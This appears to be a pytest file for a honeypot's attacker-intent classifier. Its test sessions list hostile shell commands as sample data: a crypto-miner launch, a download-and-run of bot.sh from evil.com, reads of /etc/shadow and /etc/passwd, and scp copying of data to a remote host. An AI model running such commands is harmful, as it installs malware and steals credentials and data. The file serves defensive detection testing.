"""Tests for the attacker classifier — rule-based fallback path."""

import pytest
from src.behavior.behavior_engine import BehaviorEngine


def test_rule_based_cryptomining():
    session = {"commands": ["xmrig --cpu-max-threads-hint 90 -o pool.example.com:3333"], "src_ip": "1.1.1.1"}
    intent, tier, conf = BehaviorEngine._rule_based_classify(session)
    assert intent == "cryptomining"
    assert conf > 0.8


def test_rule_based_malware_deployment():
    session = {"commands": ["wget http://evil.com/bot.sh", "chmod +x bot.sh", "bash bot.sh"], "src_ip": "2.2.2.2"}
    intent, tier, conf = BehaviorEngine._rule_based_classify(session)
    assert intent == "malware_deployment"


def test_rule_based_credential_harvesting():
    session = {"commands": ["cat /etc/shadow", "cat /etc/passwd"], "src_ip": "3.3.3.3"}
    intent, tier, conf = BehaviorEngine._rule_based_classify(session)
    assert intent == "credential_harvesting"


def test_rule_based_lateral_movement():
    session = {"commands": ["ssh deploy@10.0.0.5", "scp -r /data remote:/backup"], "src_ip": "4.4.4.4"}
    intent, tier, conf = BehaviorEngine._rule_based_classify(session)
    assert intent == "lateral_movement"


def test_rule_based_beginner_recon():
    session = {"commands": ["ls", "pwd"], "src_ip": "5.5.5.5"}
    intent, tier, conf = BehaviorEngine._rule_based_classify(session)
    assert intent == "reconnaissance"
    assert tier == "beginner"
